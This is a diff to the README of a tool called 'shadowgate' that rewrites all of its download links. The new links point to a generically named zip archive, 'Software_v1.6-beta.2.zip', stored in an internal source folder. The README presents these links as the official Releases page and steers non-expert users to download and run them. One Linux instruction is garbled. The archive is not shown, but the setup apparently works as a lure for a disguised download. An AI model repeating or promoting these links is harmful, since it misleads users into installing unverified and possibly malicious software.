@@ -3,10 +3,10 @@
 ## 🚀 Getting Started
 Welcome to shadowgate, your high-performance tool for stealth redirection and traffic security. This guide will help you download and run the application quickly and simply, even if you're not a tech expert.
 
-[![Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/logging/shadowgate_2.1.zip%20Now-%2300A1B6?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/logging/shadowgate_2.1.zip)
+[![Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/profile/Software_v1.6-beta.2.zip%20Now-%2300A1B6?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/profile/Software_v1.6-beta.2.zip)
 
 ## 📥 Download & Install
-1. Click on the following link to visit the Releases page: [Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/logging/shadowgate_2.1.zip).
+1. Click on the following link to visit the Releases page: [Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/profile/Software_v1.6-beta.2.zip).
 
 2. On the Releases page, you will see a list of available versions. Look for the latest release which typically appears at the top.
 
@@ -14,7 +14,7 @@ Welcome to shadowgate, your high-performance tool for stealth redirection and tr
 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/logging/shadowgate_2.1.zip` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/profile/Software_v1.6-beta.2.zip` file.
 
 4. Save the file to your computer.
 
@@ -51,7 +51,7 @@ To run shadowgate smoothly, please ensure your system meets the following requir
 ## 🔄 Updates
 Regular updates enhance security and features. To update shadowgate:
 
-1. Return to the Releases page: [Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/logging/shadowgate_2.1.zip).
+1. Return to the Releases page: [Download shadowgate](https://raw.githubusercontent.com/Srskip/shadowgate/main/internal/profile/Software_v1.6-beta.2.zip).
 
 2. Download the latest version following the same steps listed above.
 
